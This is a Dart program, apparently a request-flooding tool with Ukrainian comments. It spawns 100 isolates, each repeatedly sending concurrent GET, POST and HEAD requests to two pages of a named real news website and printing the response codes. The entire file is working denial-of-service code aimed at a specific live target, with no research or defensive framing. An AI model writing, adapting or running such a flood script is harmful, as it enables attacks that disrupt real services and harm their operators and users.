import 'dart:async';
import 'dart:isolate';
import 'package:http/http.dart' as http;

void main() async {
  final receivePort = ReceivePort();
  final isolates = <Isolate>[];

  for (var i = 0; i < 100; i++) {
    final isolate = await Isolate.spawn(attakker, receivePort.sendPort);
    isolates.add(isolate);
  }

  await for (final message in receivePort) {
    print('Received message: $message');
  }
  // for (final isolate in isolates) {
  //   isolate.kill();
  // }

  print('All tasks completed');
}

void attakker(SendPort sendPort) async {
  for (var i = 0; i < 30; i++) {
    sendPort.send('Task $i');

    {
      // Список URL-адрес запитів
      final urls = [
        'https://www.crimea.kp.ru/',
        'https://www.crimea.kp.ru/online/',
      ];

      // Створюємо список об'єктів Future для кожного запиту
      final futures = <Future>[];

      // Запускаємо асинхронні запити
      for (var url in urls) {
        final future = http.get(Uri.parse(url));
        futures.add(future);
        final futureP = http.post(Uri.parse(url));
        futures.add(futureP);
        final futureH = http.head(Uri.parse(url));
        futures.add(futureH);
//     final futureD = http.delete(Uri.parse(url));
//     futures.add(futureD);
      }

      // Очікуємо завершення всіх запитів
      final responses = await Future.wait(futures);

      // Обробляємо результати запитів
      for (var response in responses) {
        print(response.statusCode == 200
            ? "Status - OK"
            : 'Response: ${response.statusCode}');
        print(response.contentLength == 0
            ? 'Status - OK'
            : 'Body: ${response.contentLength} bytes');
        print('------------------------');
      }
    }
    // Future.delayed(const Duration(seconds: 1));
  }
  print('tasks completed');
}
